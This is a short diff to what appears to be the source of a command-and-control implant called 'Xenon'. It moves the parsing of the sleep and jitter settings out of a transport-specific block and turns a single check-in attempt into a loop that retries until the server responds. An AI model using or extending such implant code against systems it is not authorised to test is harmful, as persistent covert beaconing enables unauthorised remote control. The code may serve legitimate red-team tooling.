@@ -43,6 +43,8 @@ VOID XenonConfigure()
     {
         xenonConfig->aesKey          = ParserStringCopy(&ParserConfig, &keyLen);                     // allocates
     }
+    xenonConfig->sleeptime           = ParserGetInt32(&ParserConfig);
+    xenonConfig->jitter              = ParserGetInt32(&ParserConfig);
 
 #ifdef HTTPX_TRANSPORT
 
@@ -53,8 +55,6 @@ VOID XenonConfigure()
         xenonConfig->proxyUsername   = ParserStringCopy(&ParserConfig, &userLen);                    // allocates
         xenonConfig->proxyPassword   = ParserStringCopy(&ParserConfig, &passLen);                    // allocates
     }
-    xenonConfig->sleeptime           = ParserGetInt32(&ParserConfig);
-    xenonConfig->jitter              = ParserGetInt32(&ParserConfig);
     xenonConfig->rotationStrategy    = ParserGetInt32(&ParserConfig);
     xenonConfig->failoverThreshold   = ParserGetInt32(&ParserConfig);
 
@@ -185,13 +185,23 @@ VOID XenonMain()
 
 
     // Fills pointer with response data from checkin
-    bStatus = CheckinSend(&data);
-    if (!bStatus)
-    {
-        _err("Failed checkin request. Exiting");
-        return;
-    }
+    // bStatus = CheckinSend(&data);
+    // if (!bStatus)
+    // {
+    //     _err("Failed checkin request. Exiting");
+    //     return;
+    // }
+
+    do {
+        
+        bStatus = CheckinSend(&data);
+        
+        if (!bStatus)
+            _err("Failed checkin request.");
+
+    } while (data.Buffer == NULL);
     
+
     // Set new agent UUID from checkin response
     bStatus = TaskCheckin(&data);
     if (!bStatus)
